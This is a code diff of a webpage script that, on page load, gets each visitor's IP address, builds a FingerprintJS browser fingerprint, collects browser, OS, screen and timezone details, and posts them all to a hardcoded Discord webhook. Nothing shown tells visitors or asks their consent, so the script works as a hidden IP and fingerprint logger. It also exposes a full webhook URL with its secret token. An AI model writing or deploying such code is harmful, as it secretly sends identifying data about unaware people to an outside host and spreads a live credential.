@@ -25,37 +25,39 @@ document.addEventListener("DOMContentLoaded", async () => {
     try {
         // Step 1: Get IP address (IPv4 or IPv6)
         const ipRes = await fetch("https://api64.ipify.org?format=json");
+        if (!ipRes.ok) throw new Error("Failed to fetch IP");
         const ipData = await ipRes.json();
-        const ip = ipData.ip;
+        const ip = ipData.ip || "Unknown";
 
         // Step 2: Get visitor fingerprint
         const fp = await FingerprintJS.load();
         const result = await fp.get();
-        const visitorId = result.visitorId;
-        const components = result.components;
 
-        const browser = components.userAgent?.value || "Unknown";
-        const platform = components.platform?.value || "Unknown";
+        const visitorId = result.visitorId || "Unknown";
+        const browser = result.components.userAgent?.value || "Unknown";
+        const platform = result.components.platform?.value || "Unknown";
         const screenRes = `${window.screen.width}x${window.screen.height}`;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
 
         // Step 3: Send data to Discord webhook
         const webhookUrl = "https://discord.com/api/webhooks/1385635781434937424/LRV8v5TBSzwJkNrdOtXWapcHYBI9UZTmqgFFIeQCHnt0zptn5Io1TA1kyzezcfkEBFEt";
 
-        const payload = {
-            content: `📩 **New Visitor Logged**
-**IP Address:** ${ip}
-**Visitor ID:** ${visitorId}
-**Browser:** ${browser}
-**Platform/OS:** ${platform}
-**Screen:** ${screenRes}
-**Timezone:** ${timezone}`
+        const message = {
+            content: `📩 **New Visitor Logged**\n` +
+                     `**IP Address:** ${ip}\n` +
+                     `**Visitor ID:** ${visitorId}\n` +
+                     `**Browser:** ${browser}\n` +
+                     `**Platform/OS:** ${platform}\n` +
+                     `**Screen:** ${screenRes}\n` +
+                     `**Timezone:** ${timezone}`
         };
 
         await fetch(webhookUrl, {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(message)
         });
 
         console.log("Visitor data sent to Discord.");
